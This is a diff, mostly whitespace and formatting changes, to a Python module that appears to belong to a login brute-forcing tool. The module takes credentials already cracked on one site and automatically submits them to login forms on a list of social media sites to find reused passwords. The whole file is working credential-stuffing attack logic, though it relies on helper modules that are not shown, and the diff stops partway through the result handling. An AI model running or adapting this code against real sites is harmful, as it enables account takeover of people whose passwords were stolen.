@@ -1,98 +1,96 @@
-
 from modules import loginbrute
 import data, threading
 import utils
 from libs.mbrowser import startBrowser, parseLoginForm
-
 
 try:
 	from Queue import Queue
 except ImportError:
 	from queue import Queue
 
+
 def do_job(jobs):
 	for job in jobs:
 		job.start()
-
+	
 	for job in jobs:
 		job.join()
-		
-def submit(url, options, tryCreds, result):
 
+
+def submit(url, options, tryCreds, result):
 	try:
 		proc = startBrowser()
-
-		utils.printf("[+] Checking %s" %(url))
-
+		
+		utils.printf("[+] Checking %s" % (url))
+		
 		proc.open(url)
 		loginInfo = parseLoginForm(proc.forms())
-
+	
 	except Exception as err:
 		if options.verbose:
-			utils.printf("[x] ReAuth: %s at %s" %(err, url), "bad")
-		
-
+			utils.printf("[x] ReAuth: %s at %s" % (err, url), "bad")
+	
 	if not loginInfo:
 		if options.verbose:
-			utils.printf("[x] ReAuth: Can't find login form at %s" %(url), "bad")
+			utils.printf("[x] ReAuth: Can't find login form at %s" % (url), "bad")
 	else:
 		try:
 			options.url = url
-
+			
 			loginbrute.submit(
 				# Reverse username + password. Dynamic submit in loginbrute
 				options, loginInfo, tryCreds[-2:][::-1], result
 			)
 		except Exception as err:
 			if options.verbose:
-				utils.printf("[x] ReAuth: Submitting error for %s" %(err), "bad")
+				utils.printf("[x] ReAuth: Submitting error for %s" % (err), "bad")
+
 
 def run(options, creds):
 	social_urls = data.social_urls().replace("\t", "").split("\n")
-
+	
 	for url in social_urls:
 		if options.url in url:
 			social_urls.remove(url)
-
-
+	
 	result = Queue()
-	#workers = []
-
+	# workers = []
+	
 	try:
 		for tryCreds in creds:
 			for url in social_urls:
 				submit(url, options, tryCreds, result)
-
-				# if len(workers) == options.threads:
-				# 	do_job(workers)
-				# 	del workers[:]
-
-				# worker = threading.Thread(
-				# 	target = submit,
-				# 	args = (url, options, tryCreds, result)
-				# )
-
-				#worker.daemon = True
-				#workers.append(worker)
-
-		#do_job(workers)
-		#del workers[:]
-		
+			
+			# if len(workers) == options.threads:
+			# 	do_job(workers)
+			# 	del workers[:]
+			
+			# worker = threading.Thread(
+			# 	target = submit,
+			# 	args = (url, options, tryCreds, result)
+			# )
+			
+			# worker.daemon = True
+			# workers.append(worker)
+	
+	# do_job(workers)
+	# del workers[:]
+	
 	
 	except KeyboardInterrupt:
 		utils.printf("[x] Terminated by user!", "bad")
 		import os
 		os._exit(0)
-
+	
 	except SystemExit:
 		utils.die("[x] Terminated by system!", "SystemExit")
 	
 	except Exception as err:
 		utils.die("[x] ReAuth: Runtime error", err)
-				
+	
 	finally:
 		result = list(result.queue)
-
+		
 		if len(result) == 0:
 			utils.printf("[-] No extra valid password found", "bad")
 		else:
